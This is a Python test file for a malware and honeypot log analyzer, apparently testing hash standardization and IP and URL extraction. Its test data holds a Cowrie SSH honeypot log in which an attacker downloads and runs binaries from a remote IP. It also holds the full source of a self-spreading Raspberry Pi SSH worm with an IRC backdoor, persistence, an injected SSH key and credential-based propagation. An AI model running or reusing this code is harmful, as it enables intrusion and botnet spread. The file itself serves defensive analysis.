from analyzerbase import *


class TestUtils(TestCase):
    
    def setUp(self) -> None:
        
        return super().setUp()
    


    def test_standardize_malware(self):
        mw1 = Malware("9972b39bdad6e973490f4988693e0d730a93a4c4968fb542bdd3b28b8393a8a4")
        mw2 = Malware("a63b0fd571a077734a68f5955bf91986c5f39af23f1d4552e02662aa9bac0458")

        print_diff_lines(mw1.text, mw2.text)
        print_diff_lines(mw1.shasum, mw2.shasum)
        self.assertNotEqual(mw1.text, mw2.text)
        self.assertNotEqual(mw1.shasum, mw2.shasum)

        # print(mw1.standardized_hash)
        # print(mw2.standardized_hash)
        print_diff_lines(mw1.standardized_text, mw2.standardized_text)
        print_diff_lines(mw1.standardized_hash, mw2.standardized_hash)
        self.assertEqual(mw1.standardized_text, mw2.standardized_text)
        self.assertEqual(mw1.standardized_hash, mw2.standardized_hash)
        



    def test_all10K(self):
        data = """2023-10-30T17:25:37.694705Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 218.92.0.60:55707 (172.31.5.68:2222) [session: 3348421f0397]
2023-10-30T17:25:37.695770Z [HoneyPotSSHTransport,0,218.92.0.60] Remote SSH version: SSH-2.0-PUTTY
2023-10-30T17:25:37.866203Z [HoneyPotSSHTransport,0,218.92.0.60] SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
2023-10-30T17:25:38.808595Z [HoneyPotSSHTransport,0,218.92.0.60] Found cached: b'root':b'user'
2023-10-30T17:25:38.810222Z [HoneyPotSSHTransport,0,218.92.0.60] login attempt [b'root'/b'user'] succeeded
2023-10-30T17:25:38.811324Z [HoneyPotSSHTransport,0,218.92.0.60] Initialized emulated server as architecture: linux-x64-lsb
2023-10-30T17:25:39.177147Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,218.92.0.60] CMD: #!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c; 
2023-10-30T17:26:40.135363Z [HoneyPotSSHTransport,0,218.92.0.60] SFTP openFile: b'/bin/eyshcjdmzg'
2023-10-30T17:27:03.753600Z [HoneyPotSSHTransport,0,218.92.0.60] SFTP Uploaded file "eyshcjdmzg" to var/lib/cowrie/downloads/ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73
2023-10-30T17:27:04.154570Z [SSHChannel session (2) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,218.92.0.60] CMD: /bin/eyshcjdmzg
2023-10-30T17:27:04.155185Z [SSHChannel session (2) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,218.92.0.60] Command not found: /bin/eyshcjdmzg
2023-10-30T17:27:14.910264Z [SSHChannel session (3) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,218.92.0.60] CMD: ls -la /var/run/gcc.pid
2023-10-30T17:27:14.910837Z [SSHChannel session (3) on SSHService b'ssh-connection' on HoneyPotSSHTransport,0,218.92.0.60] Command found: ls -la /var/run/gcc.pid
2023-10-30T17:27:15.081700Z [HoneyPotSSHTransport,0,218.92.0.60] Got remote error, code 11 reason: b''
2023-10-30T17:27:15.082012Z [HoneyPotSSHTransport,0,218.92.0.60] avatar root logging out
2023-10-30T17:27:15.082192Z [HoneyPotSSHTransport,0,218.92.0.60] Connection lost after 97 seconds
"""
        data2 = """
C0755 4745 eRXQYnmy
#!/bin/bash

MYSELF=`realpath $0`
DEBUG=/dev/null
echo $MYSELF >> $DEBUG

if [ "$EUID" -ne 0 ]
then 
	NEWMYSELF=`mktemp -u 'XXXXXXXX'`
	sudo cp $MYSELF /opt/$NEWMYSELF
	sudo sh -c "echo '#!/bin/sh -e' > /etc/rc.local"
	sudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"
	sudo sh -c "echo 'exit 0' >> /etc/rc.local"
	sleep 1
	sudo reboot
else
TMP1=`mktemp`
echo $TMP1 >> $DEBUG

killall bins.sh
killall minerd
killall node
killall nodejs
killall ktx-armv4l
killall ktx-i586
killall ktx-m68k
killall ktx-mips
killall ktx-mipsel
killall ktx-powerpc
killall ktx-sh4
killall ktx-sparc
killall arm5
killall zmap
killall kaiten
killall perl

echo "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts
rm -rf /root/.bashrc
rm -rf /home/pi/.bashrc

usermod -p \$6\$vGkGPKUr\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi

mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"  >> /root/.ssh/authorized_keys

echo "nameserver 8.8.8.8" >> /etc/resolv.conf
rm -rf /tmp/ktx*
rm -rf /tmp/cpuminer-multi
rm -rf /var/tmp/kaiten

cat > /tmp/public.pem <<EOFMARKER
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs
glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW
rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF
WRq+Z8HYMvPlgSRA3wIDAQAB
-----END PUBLIC KEY-----
EOFMARKER

BOT=`mktemp -u 'XXXXXXXX'`

cat > /tmp/$BOT <<'EOFMARKER'
#!/bin/bash

SYS=`uname -a | md5sum | awk -F' ' '{print $1}'`
NICK=a${SYS:24}
while [ true ]; do

	arr[0]="ix1.undernet.org"
	arr[1]="ix2.undernet.org"
	arr[2]="Ashburn.Va.Us.UnderNet.org"
	arr[3]="Bucharest.RO.EU.Undernet.Org"
	arr[4]="Budapest.HU.EU.UnderNet.org"
	arr[5]="Chicago.IL.US.Undernet.org"
	rand=$[$RANDOM % 6]
	svr=${arr[$rand]}

	eval 'exec 3<>/dev/tcp/$svr/6667;'
	if [[ ! "$?" -eq 0 ]] ; then
			continue
	fi

	echo $NICK

	eval 'printf "NICK $NICK\r\n" >&3;'
	if [[ ! "$?" -eq 0 ]] ; then
			continue
	fi
	eval 'printf "USER user 8 * :IRC hi\r\n" >&3;'
	if [[ ! "$?" -eq 0 ]] ; then
		continue
	fi

	# Main loop
	while [ true ]; do
		eval "read msg_in <&3;"

		if [[ ! "$?" -eq 0 ]] ; then
			break
		fi

		if  [[ "$msg_in" =~ "PING" ]] ; then
			printf "PONG %s\n" "${msg_in:5}";
			eval 'printf "PONG %s\r\n" "${msg_in:5}" >&3;'
			if [[ ! "$?" -eq 0 ]] ; then
				break
			fi
			sleep 1
			eval 'printf "JOIN #biret\r\n" >&3;'
			if [[ ! "$?" -eq 0 ]] ; then
				break
			fi
		elif [[ "$msg_in" =~ "PRIVMSG" ]] ; then
			privmsg_h=$(echo $msg_in| cut -d':' -f 3)
			privmsg_data=$(echo $msg_in| cut -d':' -f 4)
			privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1)

			hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'`
			sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`

			if [[ "$sign" == "$hash" ]] ; then
				CMD=`echo $privmsg_data | base64 -d -i`
				RES=`bash -c "$CMD" | base64 -w 0`
				eval 'printf "PRIVMSG $privmsg_nick :$RES\r\n" >&3;'
				if [[ ! "$?" -eq 0 ]] ; then
					break
				fi
			fi
		fi
	done
done
EOFMARKER

chmod +x /tmp/$BOT
nohup /tmp/$BOT 2>&1 > /tmp/bot.log &
rm /tmp/nohup.log -rf
rm -rf nohup.out
sleep 3
rm -rf /tmp/$BOT

NAME=`mktemp -u 'XXXXXXXX'`

date > /tmp/.s

apt-get update -y --force-yes
apt-get install zmap sshpass -y --force-yes

while [ true ]; do
	FILE=`mktemp`
	zmap -p 22 -o $FILE -n 100000
	killall ssh scp
	for IP in `cat $FILE`
	do
		sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
		sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
	done
	rm -rf $FILE
	sleep 10
done

fi



"""

        
        print("Extracting TLDs...")
        parse_tlds()
        tlds = read_tlds()
        print("Done")


        for data in (data, data2)*10000:
            print("Extracting IPs...")
            ips = extract_ips(data)
            print("Extracting URLs...")
            urls = extract_urls(data, tlds)
            print("Done")
            print("IPs:")
            for ip in ips:
                print(ip)
            print("URLs:")
            for url in urls:
                print(url)



            g = find_urls_and_ips(data)
            print("URLs:")
            for url in g[0]:
                print(url)
            print("IPs:")
            for ip in g[1]:
                print(ip)
            print("IPv6s:")
            for ip in g[2]:
                print(ip)
            print("Done\n\n")
